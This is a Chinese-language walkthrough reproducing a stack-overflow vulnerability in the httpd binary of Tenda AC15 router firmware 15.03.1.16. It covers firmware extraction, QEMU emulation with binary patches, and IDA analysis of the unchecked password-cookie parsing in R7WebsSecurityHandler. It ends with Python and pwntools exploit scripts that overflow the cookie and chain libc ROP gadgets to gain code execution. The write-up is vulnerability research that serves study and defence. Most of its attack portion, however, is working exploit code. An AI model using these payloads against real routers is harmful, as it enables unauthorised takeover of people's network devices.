# 路由器固件型号：

Tenda AC15 15.03.1.16_multi  

# 固件下载地址：

<https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1>

# binwalk分离

    
    
    binwalk -Me US-bin
    

# 漏洞点：

在squashfs-root/bin/httpd  
可以通过

    
    
    readelf -h httpd
    

来查看文件的信息（架构）

    
    
    ELF 头：
      Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
      类别:                              ELF32
      数据:                              2 补码，小端序 (little endian)
      Version:                           1 (current)
      OS/ABI:                            UNIX - System V
      ABI 版本:                          0
      类型:                              EXEC (可执行文件)
      系统架构:                          ARM
      版本:                              0x1
      入口点地址：               0xe4a0
      程序头起点：          52 (bytes into file)
      Start of section headers:          810548 (bytes into file)
      标志：             0x5000002, Version5 EABI, <unknown>
      Size of this header:               52 (bytes)
      Size of program headers:           32 (bytes)
      Number of program headers:         8
      Size of section headers:           40 (bytes)
      Number of section headers:         28
      Section header string table index: 27
    

# 环境配置

    
    
    sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*
    cp /usr/bin/qemu-arm-static .
    

# 运行指令

    
    
    sudo chroot ./ ./qemu-arm-static ./bin/httpd
    

![](./img/3705539655391067023.png)

# 解决方法

用ida打开，搜索WeLoveLinux

![](./img/1201537588497931810.png)

![](./img/5170594779985034872.png)  
这里构成了死循环要把CMP R3,#0给patch掉，就可以了

![](./img/8850151251761016790.png)

![](./img/54592794110358801.png)  
![](./img/1195193489528806914.png)  
然后保存即可

![](./img/49786294373929730.png)

运行发现还是出错

![](./img/1937239684773681632.png)  
再用ida看一下，发现第二个判断发现也赋值了0；

![](./img/7743984548758121876.png)  
patch成1即可

# 网关配置

运行时

![](./img/7518615226851631065.png)  
ip并不是本机ip，这是因为我们没有设置虚拟网关br0，

    
    
    sudo apt install uml-utilities bridge-utils
    sudo brctl addbr br0
    sudo brctl addif br0 eth0
    sudo ifconfig br0 up
    sudo dhclient br0
    sudo tunctl -t br0 -u `whoami`
    sudo ifconfig br0 192.168.65.1/24
    

然后重新运行即可  
![](./img/108763876087184898.png)  

# 漏洞分析

根据CVE公布的poc可知，漏洞点在R7WebsSecurityHandler函数  

## IDA

    
    
    if ( *(_DWORD *)(a1 + 184) )
        {
          v40 = strstr(*(const char **)(a1 + 184), "password=");
          if ( v40 )
            sscanf(v40, "%*[^=]=%[^;];*", v33);
          else
            sscanf(*(const char **)(a1 + 184), "%*[^=]=%[^;];*", v33);
        }
    

这里未对用户的输入是否合理进行检测，导致存在栈溢出。  
我们要利用这个栈溢出需要满足

    
    
    if ( strncmp(s1, "/public/", 8u)
        && strncmp(s1, "/lang/", 6u)
        && !strstr(s1, "img/main-logo.png")
        && !strstr(s1, "reasy-ui-1.0.3.js")
        && strncmp(s1, "/favicon.ico", 0xCu)
        && *(_DWORD *)(a1 + 152)
        && strncmp(s1, "/kns-query", 0xAu)
        && strncmp(s1, "/wdinfo.php", 0xBu)
        && (strlen(s1) != 1 || *s1 != 47)
        && (strncmp(s1, "/goform/telnet", 0xEu) || g_Pass && strcmp(&g_Pass, "YWRtaW4="))
        && strncmp(s1, "/goform/fast_setting", 0x14u)
        && strncmp(s1, "/goform/ate", 0xBu)
        && strncmp(s1, "/goform/InsertWhite", 0x13u)
        && strncmp(s1, "/yun_safe.html", 0xEu)
        && strncmp(s1, "/goform/getWanConnectStatus", 0x1Bu)
        && strncmp(s1, "/goform/getProduct", 0x12u)
        && strncmp(s1, "/goform/getRebootStatus", 0x17u)
        && (i <= 2 || strncmp(s1, "/loginerr.html", 0xEu)) )
    

访问的路径不在上述存在，构造一个虚构地址即可，例/goform/blonet  
尝试输入垃圾数据，测试漏洞。

    
    
    sudo chroot ./ ./qemu-arm-static -g 4444 ./bin/httpd
    gdb-multiarch ./httpd
    target remote :1234
    b *0x002ED18 #断点下在漏洞函数结束处即可
    continue
    python3 exp.py
    
    
    
    import requests
    URL = "http://192.168.7.44:80/goform/blonet"
    cookie = {"Cookie":"password="+"a"*0x400}
    requests.get(url=URL, cookies=cookie)
    

![](./img/3559867688037682395.png)

发现程序没有运行到断点处，bt查看一下，发现在0x0002c5cc处的函数停了。

    
    
    if ( strlen(s) <= 3
          || (v42 = strchr(s, 46)) == 0
          || (v42 = (char *)v42 + 1, memcmp(v42, "gif", 3u))
          && memcmp(v42, "png", 3u)
          && memcmp(v42, "js", 2u)
          && memcmp(v42, "css", 3u)
          && memcmp(v42, "jpg", 3u)
          && memcmp(v42, "jpeg", 3u) )
    

应该是被这影响了。  
那就修改一下exp，再试试

    
    
    import requests
    URL = "http://192.168.7.44:80/goform/blonet"
    cookie = {"Cookie":"password="+"a"*0x400+".pngAAA"}
    requests.get(url=URL, cookies=cookie)
    

![](./img/3891332029872988133.png)  
可以发现成功溢出了。  
因为qemu的不会开启未开启基址随机化的特性，可以通过vmmap查看libc基地址。  
通过ropgadget查找gadget

    
    
    0x00040cb8  mov r0, sp; blx r3;
    0x00018298  pop {r3, pc};
    

# 利用exp

    
    
    import requests
        from pwn import *
    
        base = 0xf65e5000
        libc = ELF('./lib/libc.so.0')
    
        puts = base+libc.sym['puts']
        _str = "Hello\x00"
        mov_r0 = base+0x00040cb8 # mov r0, sp; blx r3;
        pop_r3 = base+0x00018298 # pop {r3, pc};
        URL = "http://192.168.7.44:80/goform/hello"
        pl = 'a'*444+".png"+p32(pop_r3)+p32(puts)+p32(mov_r0)+_str
        cookie = {"Cookie":"password="+pl}
        requests.get(url=URL, cookies=cookie)
    

![](./img/2034350480267178302.png)

